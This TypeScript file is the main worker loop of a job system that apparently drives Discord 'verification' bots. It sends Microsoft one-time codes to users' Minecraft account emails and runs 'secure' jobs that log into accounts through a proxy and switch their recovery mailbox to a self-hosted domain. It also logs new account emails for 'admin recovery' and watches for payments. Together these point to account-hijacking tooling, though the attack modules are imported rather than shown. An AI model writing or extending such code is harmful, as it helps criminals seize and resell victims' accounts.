import "dotenv/config";
import {
  pollJobs,
  updateJob,
  flushAllLogs,
  flushPendingTerminalUpdates,
  checkJobStatuses,
  postVerificationResult,
  fetchPresenceTokens,
  markVerificationSession,
  pollOtpPending,
  reportOtpResult,
  WORKER_ID as API_WORKER_ID,
} from "./api.js";
import { runMcBot, type McJobConfig, type JobRunResult } from "./mc.js";
import { runDiscordBot, type DiscordJobConfig } from "./discord.js";
import { runSecureBot, type SecureJobConfig } from "./secure.js";
import { sendOtpFromWorker } from "./otp-send.js";
import { syncPresenceBots, stopAllPresence } from "./verification-presence.js";
import { setJobPaused, clearJobPaused } from "./pause-state.js";
import { scanPendingPayments } from "./payment-watch.js";
import { acquireInstanceLock } from "./instance-lock.js";

acquireInstanceLock();

const WORKER_ID = process.env.WORKER_ID || API_WORKER_ID;
const POLL_INTERVAL = Math.max(1000, parseInt(process.env.POLL_INTERVAL_MS || "3000", 10) || 3000);
const STATUS_CHECK_INTERVAL = Math.max(5000, POLL_INTERVAL * 2);
const MAX_CONCURRENT_JOBS = Math.max(1, parseInt(process.env.MAX_CONCURRENT_JOBS || "8", 10) || 8);

if (!process.env.SITE_URL) {
  console.error("[worker] ERROR: SITE_URL is not set!");
  process.exit(1);
}

if (!process.env.WORKER_SECRET) {
  console.error("[worker] ERROR: WORKER_SECRET is not set!");
  process.exit(1);
}

{
  const rawSite = process.env.SITE_URL || "";
  const site = rawSite.replace(/\/+$/, "");
  const mailcow =
    !!(process.env.MAILCOW_API_URL || process.env.MAILCOW_URL) &&
    !!process.env.MAILCOW_API_KEY &&
    !!process.env.MAILCOW_DOMAIN;
  // Default MAIL_TLS_INSECURE=1 for Mailcow self-signed if unset
  if (mailcow && !(process.env.MAIL_TLS_INSECURE || "").trim()) {
    process.env.MAIL_TLS_INSECURE = "1";
    console.warn("[worker] MAIL_TLS_INSECURE defaulted to 1 (Mailcow self-signed)");
  }
  const tlsInsecure = /^(1|true|yes)$/i.test((process.env.MAIL_TLS_INSECURE || "").trim());
  if (rawSite.endsWith("/")) {
    console.warn(`[worker] SITE_URL had trailing slash (normalized to ${site})`);
  }
  console.log(
    `[worker] ${WORKER_ID} started, polling every ${POLL_INTERVAL}ms (max ${MAX_CONCURRENT_JOBS} concurrent) site=${site}`,
  );
  console.log(
    `[worker] mailcow=${mailcow ? "configured" : "MISSING"} tls_insecure=${tlsInsecure} imap=${process.env.MAILCOW_IMAP_HOST || "unset"}`,
  );
  if (mailcow && !tlsInsecure) {
    console.warn(
      "[worker] MAIL_TLS_INSECURE is off — Mailcow self-signed certs will fail with fetch failed. Set MAIL_TLS_INSECURE=1",
    );
  }
  if (!mailcow) {
    console.warn("[worker] Mailcow env incomplete — secure jobs will fail at recovery mailbox step");
  }
}

const runningJobs = new Map<string, AbortController>();

/** Serialize secure jobs — sticky MS proxy/session is process-global. */
let secureChain: Promise<void> = Promise.resolve();
function withSecureSlot<T>(fn: () => Promise<T>): Promise<T> {
  const prev = secureChain;
  let release!: () => void;
  secureChain = new Promise<void>((r) => {
    release = r;
  });
  return prev.then(fn).finally(() => release());
}

async function applyTerminal(jobId: string, result: JobRunResult) {
  let ok = false;
  if (result.status === "error") {
    ok = await updateJob(jobId, "error", result.error || "Job failed");
  } else if (result.status === "stopped") {
    ok = await updateJob(jobId, "stopped", result.error || "Stopped by user");
  } else {
    ok = await updateJob(jobId, "completed");
  }
  if (!ok) {
    console.error(`[worker] job ${jobId} terminal status NOT persisted (${result.status})`);
  } else {
    console.log(`[worker] job ${jobId} finished (${result.status})`);
  }
}

async function releaseUnstartedJob(jobId: string, reason: string) {
  console.warn(`[worker] releasing job ${jobId} back to pending: ${reason}`);
  try {
    await updateJob(jobId, "pending", reason);
  } catch (e) {
    console.error(`[worker] failed to release job ${jobId}:`, e);
  }
}

async function claimJob(job: { id: string; discord_id: string; type: string; config: unknown }) {
  if (runningJobs.has(job.id)) return;
  if (runningJobs.size >= MAX_CONCURRENT_JOBS) {
    // Poll already marked this job running — free it so another worker/slot can take it
    await releaseUnstartedJob(job.id, "Worker at capacity — requeued");
    return;
  }

  const controller = new AbortController();
  runningJobs.set(job.id, controller);

  console.log(`[worker] claimed job ${job.id} (${job.type})`);

  try {
    if (job.type === "mc") {
      const result = await runMcBot(
        job.id,
        job.discord_id,
        job.config as McJobConfig,
        controller.signal,
      );
      // Prefer abort if user stopped mid-run
      if (controller.signal.aborted && result.status === "completed") {
        await applyTerminal(job.id, { status: "stopped", error: "Stopped by user" });
      } else {
        await applyTerminal(job.id, result);
      }
    } else if (job.type === "discord") {
      try {
        await runDiscordBot(
          job.id,
          job.discord_id,
          job.config as DiscordJobConfig,
          controller.signal,
        );
        if (controller.signal.aborted) {
          await applyTerminal(job.id, { status: "stopped", error: "Stopped by user" });
        } else {
          // Only complete if still live — never clobber error/stopped written by runner
          const statuses = await checkJobStatuses(WORKER_ID, [job.id]);
          const current = statuses?.find((j) => j.id === job.id)?.status;
          if (!current || current === "running" || current === "pending" || current === "paused") {
            await applyTerminal(job.id, { status: "completed" });
          } else {
            console.log(
              `[worker] job ${job.id} already terminal (${current}) — not overwriting with completed`,
            );
          }
        }
      } catch (e) {
        const msg = e instanceof Error ? e.message : String(e);
        await applyTerminal(job.id, { status: "error", error: msg });
      }
    } else if (job.type === "secure") {
      const secureCfg = job.config as SecureJobConfig & { sessionId?: string };
      try {
        const result = await withSecureSlot(() =>
          runSecureBot(job.id, job.discord_id, secureCfg, controller.signal),
        );
        if (controller.signal.aborted) {
          await markVerificationSession(secureCfg.sessionId, "failed");
          await applyTerminal(job.id, { status: "stopped", error: "Stopped by user" });
        } else if (!result) {
          await markVerificationSession(secureCfg.sessionId, "failed");
          await applyTerminal(job.id, {
            status: "error",
            error: "Secure flow failed (login/recovery/timeout)",
          });
        } else {
          let completeOk = false;
          let lastCompleteErr = "";
          for (let attempt = 1; attempt <= 4; attempt++) {
            try {
              await postVerificationResult(secureCfg, result);
              completeOk = true;
              break;
            } catch (e) {
              lastCompleteErr = e instanceof Error ? e.message : String(e);
              console.error(
                `[worker] postVerificationResult attempt ${attempt}/4 failed:`,
                lastCompleteErr,
              );
              await new Promise((r) => setTimeout(r, 1000 * attempt));
            }
          }
          if (completeOk) {
            await applyTerminal(job.id, { status: "completed" });
          } else {
            // Account may already be secured — keep job error but log credentials for admin recovery
            console.error(
              `[worker] SECURE COMPLETE FAILED after success email=${result.newEmail || "?"} job=${job.id} err=${lastCompleteErr}`,
            );
            await markVerificationSession(secureCfg.sessionId, "failed");
            await applyTerminal(job.id, {
              status: "error",
              error: `Verification complete failed: ${lastCompleteErr}`,
            });
          }
        }
      } catch (secureErr) {
        const msg = secureErr instanceof Error ? secureErr.message : String(secureErr);
        await markVerificationSession(secureCfg.sessionId, "failed");
        await applyTerminal(job.id, { status: "error", error: msg });
      }
    } else {
      await applyTerminal(job.id, { status: "error", error: `Unknown job type: ${job.type}` });
    }
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    console.error(`[worker] job ${job.id} crashed:`, msg);
    await updateJob(job.id, "error", msg);
  } finally {
    runningJobs.delete(job.id);
    clearJobPaused(job.id);
  }
}

async function processOtpQueue() {
  // HTTP interactions path only (status=pending). Gateway uses securing+gateway_otp and is never claimed.
  // Always SendOtt here — flow_token is the MS proof id, NOT proof that OTP was already emailed.
  try {
    const sessions = await pollOtpPending(WORKER_ID, 3);
    for (const s of sessions) {
      console.log(`[otp] sending for session ${s.id.slice(0, 8)}… (${s.mc_email.slice(0, 3)}***)`);
      const result = await sendOtpFromWorker(s.mc_email);
      let ok = await reportOtpResult({
        session_id: s.id,
        ok: result.ok,
        security_email: result.securityEmail || s.security_email || undefined,
        proof_id: result.proofId || s.flow_token || undefined,
        error: result.error,
      });
      if (!ok) {
        await new Promise((r) => setTimeout(r, 800));
        ok = await reportOtpResult({
          session_id: s.id,
          ok: result.ok,
          security_email: result.securityEmail || s.security_email || undefined,
          proof_id: result.proofId || s.flow_token || undefined,
          error: result.error,
        });
      }
      if (!ok && result.ok) {
        // Session stuck in securing — force failed so Discord path can recover
        await markVerificationSession(s.id, "failed");
      }
      console.log(
        `[otp] session ${s.id.slice(0, 8)}… result ok=${result.ok} reported=${ok}${result.error ? ` err=${result.error}` : ""}`,
      );
    }
  } catch (e) {
    console.error("[otp] queue error:", e);
  }
}

async function poll() {
  try {
    await flushPendingTerminalUpdates();
    // OTP sends first — verification UX is latency-sensitive
    await processOtpQueue();
    const free = MAX_CONCURRENT_JOBS - runningJobs.size;
    if (free <= 0) return;
    const jobs = await pollJobs(WORKER_ID, free);
    for (const job of jobs) {
      if (runningJobs.size >= MAX_CONCURRENT_JOBS) {
        await releaseUnstartedJob(job.id, "Worker at capacity — requeued");
        continue;
      }
      void claimJob(job);
    }
  } catch (err) {
    console.error("[worker] poll error:", err);
  }
}

async function checkRunningJobs() {
  if (runningJobs.size === 0) return;

  const jobIds = Array.from(runningJobs.keys());
  const statuses = await checkJobStatuses(WORKER_ID, jobIds);
  // null = API failure — do not abort/pause based on empty list
  if (statuses == null) return;

  for (const { id, status } of statuses) {
    if (status === "paused") {
      setJobPaused(id, true);
    } else if (status === "running" || status === "pending") {
      setJobPaused(id, false);
    } else if (
      status === "stopping" ||
      status === "stopped" ||
      status === "completed" ||
      status === "error"
    ) {
      // completed/error also abort — clear-all / nuke may skip stopping window
      clearJobPaused(id);
      console.log(`[worker] job ${id} marked ${status} in DB, aborting`);
      const controller = runningJobs.get(id);
      if (controller) controller.abort();
    }
  }
}

let lastPresenceLog = 0;
let lastPresenceCount = -1;

async function refreshPresence() {
  try {
    const bots = await fetchPresenceTokens();
    syncPresenceBots(bots);
    const n = bots.length;
    const now = Date.now();
    // Avoid flooding pm2 logs every 60s when nothing changed
    if (n !== lastPresenceCount || now - lastPresenceLog > 10 * 60_000) {
      lastPresenceCount = n;
      lastPresenceLog = now;
      if (n > 0) console.log(`[presence] ${n} verification bot(s) online`);
      else console.log("[presence] no bot token configured");
    }
  } catch (e) {
    console.error("[presence] sync failed:", e);
  }
}

const PAY_WATCH_INTERVAL = Math.max(
  15_000,
  parseInt(process.env.PAYMENT_WATCH_MS || "30000", 10) || 30_000,
);

const pollTimer = setInterval(poll, POLL_INTERVAL);
const statusCheckTimer = setInterval(checkRunningJobs, STATUS_CHECK_INTERVAL);
const presenceTimer = setInterval(refreshPresence, 60_000);
const payWatchTimer = setInterval(() => {
  scanPendingPayments().catch((e) => console.error("[pay-watch]", e));
}, PAY_WATCH_INTERVAL);
poll();
checkRunningJobs();
refreshPresence();
scanPendingPayments().catch((e) => console.error("[pay-watch]", e));

async function shutdown() {
  console.log("[worker] shutting down...");
  clearInterval(pollTimer);
  clearInterval(statusCheckTimer);
  clearInterval(presenceTimer);
  clearInterval(payWatchTimer);
  stopAllPresence();

  const abortPromises: Promise<void>[] = [];
  for (const [id, controller] of runningJobs) {
    console.log(`[worker] aborting job ${id}`);
    controller.abort();
    abortPromises.push(
      new Promise<void>((resolve) => {
        const check = setInterval(() => {
          if (!runningJobs.has(id)) {
            clearInterval(check);
            resolve();
          }
        }, 500);
        setTimeout(() => {
          clearInterval(check);
          resolve();
        }, 9000);
      }),
    );
  }

  await Promise.race([
    Promise.all(abortPromises),
    new Promise<void>((resolve) => setTimeout(resolve, 10000)),
  ]);

  for (const id of runningJobs.keys()) {
    await updateJob(id, "stopped", "Worker shutdown").catch(() => {});
  }

  runningJobs.clear();
  await flushAllLogs();
  process.exit(0);
}

process.on("SIGINT", shutdown);
process.on("SIGTERM", shutdown);
process.on("SIGHUP", shutdown);
